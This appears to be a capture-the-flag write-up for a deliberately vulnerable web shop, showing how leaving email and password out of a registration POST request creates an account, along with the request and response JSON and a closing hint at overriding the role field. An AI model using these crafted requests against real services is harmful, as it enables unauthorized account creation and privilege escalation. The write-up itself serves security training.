# Empty User Registration
**Description**
Register a user with an empty email and password.

Topic: Improper Input Validation

## Solution

I registerd a dummy user, viewed at cadio and saw a POST request to `/api/Users/`

the body was:
```json
{
    "email":"a@test.com",
    "password":"12345",
    "passwordRepeat":"12345",
    "securityQuestion":
        {
            "id":1,
            "question":"Your eldest siblings middle name?",
            "createdAt":"2026-06-06T13:19:22.739Z",
            "updatedAt":"2026-06-06T13:19:22.739Z"
        },
    "securityAnswer":"a"
}
```

Tried with an empty email and password, it didn't worked!

Then I removed the `email`, `password` and `passwordrepeat` from the post, kept only the necessary!

```json
{
    "securityQuestion":{
        "id":1,
        "question":"Your eldest siblings middle name?",
        "createdAt":"2026-06-06T13:19:22.739Z",
        "updatedAt":"2026-06-06T13:19:22.739Z"
    },
    "securityAnswer":"a"
}
```
And I received a "success" (201)
```json
{
    "status": "success",
    "data": {
        "username": "",
        "role": "customer",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/default.svg",
        "isActive": true,
        "id": 26,
        "updatedAt": "2026-06-06T16:16:21.583Z",
        "createdAt": "2026-06-06T16:16:21.583Z",
        "email": null,
        "deletedAt": null
    }
}
```

Ideas for the future... override `rule`...